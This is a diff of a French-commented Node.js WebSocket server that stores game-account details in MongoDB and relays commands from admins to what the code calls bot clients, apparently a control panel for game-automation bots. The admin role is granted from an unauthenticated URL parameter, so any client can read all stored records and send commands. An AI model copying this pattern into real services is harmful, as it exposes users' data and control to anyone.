@@ -7,9 +7,10 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
+// Connexion MongoDB
 mongoose.connect(process.env.MONGO_URI)
-  .then(() => console.log("✅ [DB] MongoDB Connecté"))
-  .catch(err => console.error("❌ [DB] Erreur :", err));
+  .then(() => console.log("✅ [DB] MongoDB Connecté avec succès"))
+  .catch(err => console.error("❌ [DB] Erreur de connexion :", err));
 
 const ClientSchema = new mongoose.Schema({
     userId: { type: Number, unique: true },
@@ -17,7 +18,7 @@ const ClientSchema = new mongoose.Schema({
     displayName: String,
     accountAge: Number,
     jobId: String,
-    server: mongoose.Schema.Types.Mixed, // Contiendra PrivateServerId et PrivateServerOwnerId
+    server: mongoose.Schema.Types.Mixed,
     animals: mongoose.Schema.Types.Mixed, 
     isConnected: { type: Boolean, default: false },
     updatedAt: { type: Date, default: Date.now }
@@ -25,13 +26,13 @@ const ClientSchema = new mongoose.Schema({
 
 const ClientModel = mongoose.model('Client', ClientSchema);
 
-// OPTIMISÉ : Récupère uniquement le nécessaire et utilise .lean() pour économiser la RAM
+// Fonction de Broadcast (Optimisée avec .lean() pour la RAM)
 async function broadcastToAdmins() {
     try {
         const allClients = await ClientModel.find()
             .select('name displayName userId server animals isConnected updatedAt')
             .sort({ updatedAt: -1 })
-            .limit(500) // N'affiche que les 50 derniers mis à jour pour protéger la RAM
+            .limit(100)
             .lean(); 
 
         const payload = JSON.stringify({ type: 'REFRESH', data: allClients });
@@ -58,23 +59,8 @@ wss.on('connection', (ws, req) => {
     ws.isAdmin = (role === 'Admin');
     ws.userName = userName;
 
-    if (ws.isAdmin) {
-        broadcastToAdmins();
-    } else {
-        updateStatus(userName, true);
-    }
-
-    wss.on('connection', (ws, req) => {
-    const params = new URLSearchParams(req.url.split('?')[1]);
-    const role = params.get('role');
-    const userName = params.get('user') || 'Inconnu';
-    
-    ws.isAdmin = (role === 'Admin');
-    ws.userName = userName;
-
-    // Log de connexion initiale
     const timestamp = new Date().toLocaleTimeString();
-    console.log(`\n[${timestamp}] ✨ NEW_CONNECTION: ${ws.isAdmin ? "🚩 ADMIN" : "👤 CLIENT"} | User: ${userName}`);
+    console.log(`\n[${timestamp}] ✨ NEW_CONN: ${ws.isAdmin ? "🚩 ADMIN" : "👤 CLIENT"} | ${userName}`);
 
     if (ws.isAdmin) {
         broadcastToAdmins();
@@ -86,15 +72,11 @@ wss.on('connection', (ws, req) => {
         try {
             const payload = JSON.parse(message);
 
-            // --- LOGIQUE : RÉCEPTION DES DONNÉES DU BOT ---
             if (payload.Method === "ClientInfos") {
                 const d = payload.Data;
-                
-                // Calcul rapide pour le log
-                const animalCount = d.Animals ? d.Animals.length : 0;
                 const isPrivate = d.Server.PrivateServerId !== "" && d.Server.PrivateServerId !== "0";
 
-                console.log(`[${new Date().toLocaleTimeString()}] 📥 DATA from ${d.Name} | Pets: ${animalCount} | Type: ${isPrivate ? 'PRIVATE' : 'PUBLIC'}`);
+                console.log(`[${new Date().toLocaleTimeString()}] 📥 DATA: ${d.Name} | Private: ${isPrivate}`);
 
                 await ClientModel.findOneAndUpdate(
                     { userId: d.UserId },
@@ -113,10 +95,9 @@ wss.on('connection', (ws, req) => {
                 broadcastToAdmins();
             }
 
-            // --- LOGIQUE : RELAIS DES COMMANDES ---
             if (payload.type === "COMMAND") {
                 const { target, method, data } = payload;
-                console.log(`[${new Date().toLocaleTimeString()}] 🕹️ COMMAND RELAY: ${method} -> ${target}`);
+                console.log(`[${new Date().toLocaleTimeString()}] 🕹️ COMMAND: ${method} -> ${target}`);
 
                 let targetFound = false;
                 wss.clients.forEach(client => {
@@ -125,29 +106,26 @@ wss.on('connection', (ws, req) => {
                         targetFound = true;
                     }
                 });
-
-                if (targetFound) {
-                    console.log(`   ✅ Success: Message sent to ${target}`);
-                } else {
-                    console.warn(`   ⚠️ Warning: Target ${target} not found or socket closed.`);
-                }
+                if (!targetFound) console.warn(`   ⚠️ Target ${target} non trouvé.`);
             }
-
         } catch (e) { 
-            console.error(`[${new Date().toLocaleTimeString()}] ❌ MESSAGE_ERR from ${ws.userName}:`, e.message); 
+            console.error(`⚠️ [ERR] de ${ws.userName}:`, e.message); 
         }
     });
 
     ws.on('close', () => {
-        console.log(`[${new Date().toLocaleTimeString()}] 🔌 DISCONNECTED: ${ws.userName}`);
+        console.log(`[${new Date().toLocaleTimeString()}] 🔌 DISCONNECT: ${ws.userName}`);
         if (!ws.isAdmin) updateStatus(ws.userName, false);
     });
 
     ws.on('error', (err) => {
-        console.error(`[${new Date().toLocaleTimeString()}] 💥 SOCKET_ERR (${ws.userName}):`, err.message);
+        console.error(`💥 [SOCKET_ERR]:`, err.message);
     });
 });
 
 app.use(express.static('public'));
+
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`🚀 SERVEUR PRÊT SUR ${PORT}`));
+server.listen(PORT, () => {
+    console.log(`🚀 SERVEUR M4GIX PRÊT SUR LE PORT ${PORT}`);
+});
